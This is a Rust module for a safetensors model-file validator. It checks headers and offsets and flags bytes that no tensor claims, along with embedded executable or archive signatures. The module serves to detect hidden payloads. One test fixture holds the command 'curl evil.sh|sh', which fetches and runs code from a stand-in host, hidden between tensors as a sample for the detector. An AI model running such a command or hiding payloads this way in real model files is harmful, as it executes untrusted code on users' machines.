//! safetensors structural validation.
//!
//! The format is safe *by design* (no executable code) but still has
//! format-level attack surface: a malformed header or overlapping/out-of-bounds
//! tensor offsets can cause out-of-bounds reads or DoS at load time. We parse
//! the `u64` length prefix + JSON header and validate every tensor's byte range.
//!
//! We also account for every byte. Validating that each tensor range is in
//! bounds is not enough: bytes inside the data segment that *no* tensor claims
//! are a storage channel the format cannot explain, they are invisible to every
//! loader, and the manifest hash does not cover them. Real writers pack tensors
//! contiguously, so any unclaimed region is reported.

use serde_json::Value;

use crate::hash::{self, TensorEntry};
use crate::report::{ArtifactReport, Finding, Severity, Verdict};

/// Byte size of a safetensors dtype, if known.
fn dtype_size(dtype: &str) -> Option<u64> {
    Some(match dtype {
        "F64" | "I64" | "U64" => 8,
        "F32" | "I32" | "U32" => 4,
        "F16" | "BF16" | "I16" | "U16" => 2,
        "I8" | "U8" | "BOOL" | "F8_E4M3" | "F8_E5M2" => 1,
        _ => return None,
    })
}

pub fn analyze(artifact_name: &str, data: &[u8]) -> ArtifactReport {
    let mut report = ArtifactReport::new(artifact_name, "safetensors");

    if data.len() < 8 {
        return malformed(
            report,
            "ST_HEADER_MALFORMED",
            "file shorter than 8-byte header length",
        );
    }
    let header_len = u64::from_le_bytes(data[0..8].try_into().unwrap());
    let header_end = match 8u64.checked_add(header_len) {
        Some(v) => v,
        None => {
            return malformed(
                report,
                "ST_HEADER_MALFORMED",
                "header length overflows file size",
            )
        }
    };
    if header_end as usize > data.len() {
        return malformed(
            report,
            "ST_HEADER_MALFORMED",
            format!(
                "declared header length {header_len} exceeds file size {}",
                data.len()
            ),
        );
    }

    let header_bytes = &data[8..header_end as usize];
    let header: Value = match serde_json::from_slice(header_bytes) {
        Ok(v) => v,
        Err(e) => {
            return malformed(
                report,
                "ST_HEADER_MALFORMED",
                format!("header is not valid JSON: {e}"),
            )
        }
    };
    let obj = match header.as_object() {
        Some(o) => o,
        None => {
            return malformed(
                report,
                "ST_HEADER_MALFORMED",
                "header JSON is not an object",
            )
        }
    };

    let data_start = header_end as usize;
    let data_seg_len = (data.len() - data_start) as u64;

    // (begin, end, name) for overlap analysis.
    let mut intervals: Vec<(u64, u64, String)> = Vec::new();
    let mut tensor_entries: Vec<TensorEntry> = Vec::new();
    let mut had_structural_finding = false;

    for (name, spec) in obj {
        if name == "__metadata__" {
            continue;
        }
        let spec = match spec.as_object() {
            Some(s) => s,
            None => {
                report.push(Finding::new(
                    "ST_HEADER_MALFORMED",
                    Severity::Medium,
                    format!("tensor '{name}' spec is not an object"),
                ));
                had_structural_finding = true;
                continue;
            }
        };

        let dtype = spec.get("dtype").and_then(|v| v.as_str()).unwrap_or("");
        let shape: Vec<u64> = spec
            .get("shape")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|x| x.as_u64()).collect())
            .unwrap_or_default();
        let offsets = spec
            .get("data_offsets")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|x| x.as_u64()).collect::<Vec<_>>())
            .unwrap_or_default();

        if offsets.len() != 2 {
            report.push(Finding::new(
                "ST_HEADER_MALFORMED",
                Severity::Medium,
                format!("tensor '{name}' has malformed data_offsets"),
            ));
            had_structural_finding = true;
            continue;
        }
        let (begin, end) = (offsets[0], offsets[1]);

        // Offset sanity.
        if begin > end {
            report.push(Finding::new(
                "ST_OFFSET_OOB",
                Severity::High,
                format!("tensor '{name}' has begin ({begin}) > end ({end})"),
            ));
            had_structural_finding = true;
            continue;
        }
        if end > data_seg_len {
            report.push(
                Finding::new(
                    "ST_OFFSET_OOB",
                    Severity::High,
                    format!("tensor '{name}' end offset {end} exceeds data segment ({data_seg_len} bytes)"),
                )
                .with_evidence(vec![format!("data_offsets [{begin}, {end}]")]),
            );
            had_structural_finding = true;
            continue;
        }

        // dtype/shape vs declared byte range.
        let span = end - begin;
        match dtype_size(dtype) {
            Some(sz) => {
                let elems: u128 = shape.iter().map(|&d| d as u128).product::<u128>().max(1);
                let expected = elems * sz as u128;
                if expected != span as u128 {
                    report.push(Finding::new(
                        "ST_DTYPE_SHAPE_MISMATCH",
                        Severity::Medium,
                        format!(
                            "tensor '{name}': dtype {dtype} shape {shape:?} implies {expected} bytes but range spans {span}"
                        ),
                    ));
                    had_structural_finding = true;
                }
            }
            None => {
                report.push(Finding::new(
                    "ST_DTYPE_UNKNOWN",
                    Severity::Low,
                    format!("tensor '{name}' has unknown dtype '{dtype}'"),
                ));
            }
        }

        // Per-tensor digest over the actual bytes.
        let digest =
            hash::blake3_hex(&data[data_start + begin as usize..data_start + end as usize]);
        report
            .hashes
            .per_tensor
            .insert(name.clone(), hash::tagged(&digest));
        tensor_entries.push(TensorEntry {
            name: name.clone(),
            dtype: dtype.to_string(),
            shape,
            digest,
        });

        intervals.push((begin, end, name.clone()));
    }

    // Overlap detection.
    intervals.sort_by_key(|t| t.0);
    for w in intervals.windows(2) {
        let (_, end_a, name_a) = &w[0];
        let (begin_b, _, name_b) = &w[1];
        if begin_b < end_a {
            report.push(
                Finding::new(
                    "ST_OFFSET_OVERLAP",
                    Severity::High,
                    format!("tensors '{name_a}' and '{name_b}' have overlapping byte ranges"),
                )
                .with_evidence(vec![format!(
                    "'{name_a}' ends at {end_a}, '{name_b}' begins at {begin_b}"
                )]),
            );
            had_structural_finding = true;
        }
    }

    // Byte accounting: every byte of the data segment must belong to a tensor.
    for f in unreferenced_findings(&intervals, data, data_start, data_seg_len) {
        if f.severity >= Severity::Medium {
            had_structural_finding = true;
        }
        report.push(f);
    }

    // Manifest hash (stable across rename/repack).
    if !tensor_entries.is_empty() {
        report.hashes.manifest = Some(hash::manifest_hash(&mut tensor_entries));
    }

    report.verdict = if had_structural_finding {
        Verdict::Untrusted
    } else {
        Verdict::Clean
    };
    report
}

/// At most this many individual regions are reported before we collapse the
/// rest into one summary finding, so a file declaring thousands of tiny gaps
/// cannot flood the report.
const MAX_REPORTED_REGIONS: usize = 16;

/// File signatures worth naming when they turn up in bytes nothing claims.
const EMBEDDED_MAGICS: &[(&[u8], &str)] = &[
    (b"\x7fELF", "an ELF executable"),
    (b"\xfe\xed\xfa\xce", "a Mach-O executable"),
    (b"\xfe\xed\xfa\xcf", "a Mach-O executable"),
    (b"\xce\xfa\xed\xfe", "a Mach-O executable"),
    (b"\xcf\xfa\xed\xfe", "a Mach-O executable"),
    (b"\xca\xfe\xba\xbe", "a Mach-O universal binary"),
    (b"PK\x03\x04", "a ZIP archive"),
    (b"\x1f\x8b", "a gzip stream"),
    (b"BZh", "a bzip2 stream"),
    (b"\xfd7zXZ", "an xz stream"),
    (b"7z\xbc\xaf\x27\x1c", "a 7-Zip archive"),
    (b"%PDF-", "a PDF document"),
    (b"\x89PNG", "a PNG image"),
    (b"\x80\x02", "a python pickle stream"),
    (b"\x80\x03", "a python pickle stream"),
    (b"\x80\x04", "a python pickle stream"),
    (b"\x80\x05", "a python pickle stream"),
    (b"#!/", "a script shebang"),
    (b"MZ", "a DOS/PE executable"),
];

/// Regions of the data segment that no tensor claims. `intervals` must be
/// sorted by start offset; out-of-bounds tensors are already excluded.
fn unreferenced_regions(intervals: &[(u64, u64, String)], data_seg_len: u64) -> Vec<(u64, u64)> {
    let mut regions = Vec::new();
    let mut cursor = 0u64;
    for (begin, end, _) in intervals {
        if *begin > cursor {
            regions.push((cursor, begin - cursor));
        }
        cursor = cursor.max(*end);
    }
    if cursor < data_seg_len {
        regions.push((cursor, data_seg_len - cursor));
    }
    regions
}

/// Name the file format a byte run announces itself as, if any.
fn embedded_magic(region: &[u8]) -> Option<&'static str> {
    EMBEDDED_MAGICS
        .iter()
        .find(|(magic, _)| region.starts_with(magic))
        .map(|(_, label)| *label)
}

/// A short, escaped preview of bytes we are about to report on.
fn preview(region: &[u8]) -> String {
    let mut out = String::new();
    for b in region.iter().take(32) {
        match b {
            0x20..=0x7e => out.push(*b as char),
            _ => out.push_str(&format!("\\x{b:02x}")),
        }
    }
    if region.len() > 32 {
        out.push('…');
    }
    out
}

/// Report every byte of the data segment that no tensor accounts for.
fn unreferenced_findings(
    intervals: &[(u64, u64, String)],
    data: &[u8],
    data_start: usize,
    data_seg_len: u64,
) -> Vec<Finding> {
    let regions = unreferenced_regions(intervals, data_seg_len);
    let mut findings = Vec::new();
    let mut hidden_total = 0u64;
    let mut hidden_regions = 0usize;

    for (i, (begin, len)) in regions.iter().enumerate() {
        let start = data_start + *begin as usize;
        let region = &data[start..start + *len as usize];
        let placement = if begin + len == data_seg_len {
            "after the last tensor"
        } else {
            "between tensors"
        };

        if region.iter().all(|b| *b == 0) {
            if i < MAX_REPORTED_REGIONS {
                findings.push(Finding::new(
                    "ST_UNREFERENCED_BYTES",
                    Severity::Low,
                    format!(
                        "{len} zero byte(s) {placement} belong to no tensor (file offset {start}); consistent \
                         with alignment padding, but no loader reads them and the manifest \
                         hash does not cover them"
                    ),
                ));
            }
            continue;
        }

        hidden_total += len;
        hidden_regions += 1;
        if i >= MAX_REPORTED_REGIONS {
            continue;
        }

        let (severity, what) = match embedded_magic(region) {
            Some(kind) => (Severity::High, format!("and begin with {kind} signature")),
            None => (Severity::Medium, "and are not zero padding".to_string()),
        };
        findings.push(
            Finding::new(
                "ST_UNREFERENCED_BYTES",
                severity,
                format!(
                    "{len} byte(s) {placement} belong to no tensor (file offset {start}) {what}; \
                     safetensors cannot explain these bytes, no loader reads them, and \
                     the manifest hash does not cover them"
                ),
            )
            .with_evidence(vec![
                format!("file offsets {start}..{}", start + *len as usize),
                format!("first bytes: {}", preview(region)),
            ]),
        );
    }

    if hidden_regions > MAX_REPORTED_REGIONS {
        findings.push(Finding::new(
            "ST_UNREFERENCED_BYTES",
            Severity::High,
            format!(
                "{hidden_regions} regions totalling {hidden_total} byte(s) belong to no tensor; \
                 only the first {MAX_REPORTED_REGIONS} are listed above"
            ),
        ));
    }

    findings
}

fn malformed(mut report: ArtifactReport, id: &str, detail: impl Into<String>) -> ArtifactReport {
    report.verdict = Verdict::Malformed;
    report.push(Finding::new(id, Severity::High, detail));
    report
}

// ---------------------------------------------------------------------------
// Phase 2 support: tensor extraction (read-only, does not affect verdicts).
// ---------------------------------------------------------------------------

/// A tensor located within the file's data segment.
pub struct StTensor {
    pub name: String,
    pub dtype: String,
    pub shape: Vec<u64>,
    /// Absolute byte offset/length within the file.
    pub offset: usize,
    pub len: usize,
}

pub struct StExtract {
    pub tensors: Vec<StTensor>,
    pub metadata: std::collections::BTreeMap<String, String>,
}

/// Parse the header and locate every tensor's byte range. Returns `Err` on a
/// structurally unreadable header (the Phase 1 `analyze` already reports why).
pub fn extract(data: &[u8]) -> Result<StExtract, String> {
    if data.len() < 8 {
        return Err("file shorter than header length".into());
    }
    let header_len = u64::from_le_bytes(data[0..8].try_into().unwrap());
    let header_end = 8u64
        .checked_add(header_len)
        .ok_or("header length overflow")? as usize;
    if header_end > data.len() {
        return Err("header length exceeds file".into());
    }
    let header: Value = serde_json::from_slice(&data[8..header_end])
        .map_err(|e| format!("bad header json: {e}"))?;
    let obj = header.as_object().ok_or("header is not an object")?;

    let data_start = header_end;
    let data_seg_len = data.len() - data_start;
    let mut tensors = Vec::new();
    let mut metadata = std::collections::BTreeMap::new();

    for (name, spec) in obj {
        if name == "__metadata__" {
            if let Some(m) = spec.as_object() {
                for (k, v) in m {
                    if let Some(s) = v.as_str() {
                        metadata.insert(k.clone(), s.to_string());
                    }
                }
            }
            continue;
        }
        let spec = match spec.as_object() {
            Some(s) => s,
            None => continue,
        };
        let dtype = spec
            .get("dtype")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let shape: Vec<u64> = spec
            .get("shape")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|x| x.as_u64()).collect())
            .unwrap_or_default();
        let offsets = spec
            .get("data_offsets")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|x| x.as_u64()).collect::<Vec<_>>())
            .unwrap_or_default();
        if offsets.len() != 2 {
            continue;
        }
        let (begin, end) = (offsets[0], offsets[1]);
        if begin > end || end > data_seg_len as u64 {
            continue; // out-of-bounds tensors are flagged by Phase 1; skip here
        }
        tensors.push(StTensor {
            name: name.clone(),
            dtype,
            shape,
            offset: data_start + begin as usize,
            len: (end - begin) as usize,
        });
    }

    Ok(StExtract { tensors, metadata })
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a minimal safetensors buffer from a header object + data bytes.
    fn build(header: &Value, data: &[u8]) -> Vec<u8> {
        let hdr = serde_json::to_vec(header).unwrap();
        let mut out = Vec::new();
        out.extend_from_slice(&(hdr.len() as u64).to_le_bytes());
        out.extend_from_slice(&hdr);
        out.extend_from_slice(data);
        out
    }

    #[test]
    fn clean_file_is_clean_and_hashed() {
        let header = serde_json::json!({
            "weight": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}
        });
        let buf = build(&header, &[1, 2, 3, 4]);
        let r = analyze("model.safetensors", &buf);
        assert_eq!(r.verdict, Verdict::Clean);
        assert!(r.hashes.manifest.is_some());
    }

    #[test]
    fn rename_does_not_change_manifest() {
        let header = serde_json::json!({
            "weight": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}
        });
        let buf = build(&header, &[1, 2, 3, 4]);
        let a = analyze("a.safetensors", &buf);
        let b = analyze("renamed.safetensors", &buf);
        assert_eq!(a.hashes.manifest, b.hashes.manifest);
    }

    #[test]
    fn overlapping_offsets_flagged() {
        let header = serde_json::json!({
            "a": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]},
            "b": {"dtype": "U8", "shape": [4], "data_offsets": [2, 6]}
        });
        let buf = build(&header, &[0u8; 6]);
        let r = analyze("bad.safetensors", &buf);
        assert!(r.findings.iter().any(|f| f.id == "ST_OFFSET_OVERLAP"));
        assert_eq!(r.verdict, Verdict::Untrusted);
    }

    #[test]
    fn oversized_header_is_malformed() {
        let mut buf = Vec::new();
        buf.extend_from_slice(&(9999u64).to_le_bytes());
        buf.extend_from_slice(b"{}");
        let r = analyze("bad.safetensors", &buf);
        assert_eq!(r.verdict, Verdict::Malformed);
    }

    // -----------------------------------------------------------------
    // Byte accounting: bytes no tensor claims
    // -----------------------------------------------------------------

    fn iv(spans: &[(u64, u64)]) -> Vec<(u64, u64, String)> {
        spans
            .iter()
            .enumerate()
            .map(|(i, (b, e))| (*b, *e, format!("t{i}")))
            .collect()
    }

    fn findings_of<'a>(r: &'a ArtifactReport, id: &str) -> Vec<&'a Finding> {
        r.findings.iter().filter(|f| f.id == id).collect()
    }

    /// Two tensors with a hole between them, and something hidden in the hole.
    fn file_with_gap(payload: &[u8]) -> Vec<u8> {
        let gap = payload.len() as u64;
        let header = serde_json::json!({
            "a": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]},
            "b": {"dtype": "U8", "shape": [4], "data_offsets": [4 + gap, 8 + gap]}
        });
        let mut data = vec![1u8, 2, 3, 4];
        data.extend_from_slice(payload);
        data.extend_from_slice(&[5, 6, 7, 8]);
        build(&header, &data)
    }

    #[test]
    fn contiguous_tensors_leave_nothing_unaccounted() {
        assert!(unreferenced_regions(&iv(&[(0, 4), (4, 8)]), 8).is_empty());
    }

    #[test]
    fn regions_finds_gaps_and_the_tail() {
        assert_eq!(
            unreferenced_regions(&iv(&[(0, 4), (8, 12)]), 12),
            vec![(4, 4)]
        );
        assert_eq!(unreferenced_regions(&iv(&[(0, 4)]), 20), vec![(4, 16)]);
        assert_eq!(
            unreferenced_regions(&iv(&[(2, 4), (8, 10)]), 16),
            vec![(0, 2), (4, 4), (10, 6)]
        );
    }

    #[test]
    fn a_contained_tensor_does_not_invent_a_gap() {
        // 'b' sits inside 'a' (overlap, reported separately): the cursor must
        // not rewind and report phantom unclaimed bytes after it.
        assert!(unreferenced_regions(&iv(&[(0, 16), (4, 8)]), 16).is_empty());
    }

    #[test]
    fn an_empty_data_segment_is_fully_accounted_for() {
        assert!(unreferenced_regions(&[], 0).is_empty());
    }

    #[test]
    fn magic_bytes_are_named() {
        assert_eq!(
            embedded_magic(b"\x7fELF\x02\x01"),
            Some("an ELF executable")
        );
        assert_eq!(embedded_magic(b"PK\x03\x04rest"), Some("a ZIP archive"));
        assert_eq!(
            embedded_magic(b"\x80\x04\x95payload"),
            Some("a python pickle stream")
        );
        assert_eq!(embedded_magic(b"just some bytes"), None);
        assert_eq!(embedded_magic(b""), None);
    }

    #[test]
    fn a_payload_hidden_between_tensors_is_caught() {
        let buf = file_with_gap(b"\x7fELFcurl evil.sh|sh");
        let r = analyze("model.safetensors", &buf);
        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
        assert_eq!(f.len(), 1, "expected exactly one region: {:?}", r.findings);
        assert_eq!(f[0].severity, Severity::High);
        assert!(f[0].detail.contains("between tensors"), "{}", f[0].detail);
        assert!(f[0].detail.contains("an ELF executable"), "{}", f[0].detail);
        // A file carrying content the format cannot explain is not clean.
        assert_eq!(r.verdict, Verdict::Untrusted);
    }

    #[test]
    fn unexplained_bytes_without_a_known_magic_still_fail() {
        let buf = file_with_gap(b"some hidden note, no magic bytes");
        let r = analyze("model.safetensors", &buf);
        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Medium);
        assert_eq!(r.verdict, Verdict::Untrusted);
    }

    #[test]
    fn data_appended_after_the_last_tensor_is_caught() {
        let header = serde_json::json!({
            "a": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}
        });
        let mut data = vec![1u8, 2, 3, 4];
        data.extend_from_slice(b"PK\x03\x04appended archive");
        let r = analyze("model.safetensors", &build(&header, &data));
        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert!(
            f[0].detail.contains("after the last tensor"),
            "{}",
            f[0].detail
        );
        assert!(f[0].detail.contains("a ZIP archive"), "{}", f[0].detail);
        assert_eq!(r.verdict, Verdict::Untrusted);
    }

    #[test]
    fn zero_padding_is_reported_but_does_not_condemn_the_file() {
        let buf = file_with_gap(&[0u8; 24]);
        let r = analyze("model.safetensors", &buf);
        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Low);
        assert!(f[0].detail.contains("alignment padding"), "{}", f[0].detail);
        assert_eq!(r.verdict, Verdict::Clean, "padding is not a payload");
    }

    #[test]
    fn the_evidence_locates_the_bytes_in_the_file() {
        let buf = file_with_gap(b"\x7fELFhidden");
        let r = analyze("model.safetensors", &buf);
        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
        let ev = f[0].evidence.join(" ");
        assert!(ev.contains("file offsets"), "{ev}");
        assert!(ev.contains("\\x7fELFhidden"), "{ev}");
        // The offsets are absolute, so `dd` on the reported range finds it.
        let start: usize = ev
            .split("file offsets ")
            .nth(1)
            .unwrap()
            .split("..")
            .next()
            .unwrap()
            .parse()
            .unwrap();
        assert_eq!(&buf[start..start + 4], b"\x7fELF");
    }

    #[test]
    fn a_flood_of_gaps_is_collapsed_into_one_summary() {
        // 40 tensors, each preceded by a one-byte hole carrying a payload byte.
        let mut header = serde_json::Map::new();
        let mut data = Vec::new();
        for i in 0..40u64 {
            data.push(b'X');
            let begin = data.len() as u64;
            data.extend_from_slice(&[1, 2, 3, 4]);
            header.insert(
                format!("t{i}"),
                serde_json::json!({
                    "dtype": "U8", "shape": [4], "data_offsets": [begin, begin + 4]
                }),
            );
        }
        let r = analyze("model.safetensors", &build(&Value::Object(header), &data));
        let f = findings_of(&r, "ST_UNREFERENCED_BYTES");
        assert_eq!(f.len(), MAX_REPORTED_REGIONS + 1, "cap plus one summary");
        let summary = f.last().unwrap();
        assert_eq!(summary.severity, Severity::High);
        assert!(summary.detail.contains("40 regions"), "{}", summary.detail);
        assert!(summary.detail.contains("40 byte(s)"), "{}", summary.detail);
    }

    #[test]
    fn a_clean_contiguous_file_reports_nothing() {
        let header = serde_json::json!({
            "a": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]},
            "b": {"dtype": "U8", "shape": [4], "data_offsets": [4, 8]}
        });
        let r = analyze("model.safetensors", &build(&header, &[0u8; 8]));
        assert!(findings_of(&r, "ST_UNREFERENCED_BYTES").is_empty());
        assert_eq!(r.verdict, Verdict::Clean);
    }
}
